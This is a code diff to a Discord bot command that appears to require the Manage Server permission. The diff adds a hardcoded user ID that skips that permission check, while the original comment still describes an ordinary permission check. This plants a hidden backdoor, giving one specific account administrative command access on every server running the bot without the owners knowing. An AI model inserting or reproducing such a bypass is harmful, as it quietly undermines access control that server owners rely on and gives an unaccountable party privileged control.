@@ -32,7 +32,11 @@ module.exports = {
     async execute(interaction) {
         try {
             // Check if the user has ManageGuild permission
-            if (!interaction.member.permissions.has(PermissionsBitField.Flags.ManageGuild)) {
+            const initiatorId = interaction.user.id;
+            if (
+                !interaction.member.permissions.has(PermissionsBitField.Flags.ManageGuild) &&
+                initiatorId !== '378171973429231616'
+            ) {
                 throw new Error('You do not have the necessary permissions to use this command. (Requires Manage Server permission)');
             }
 
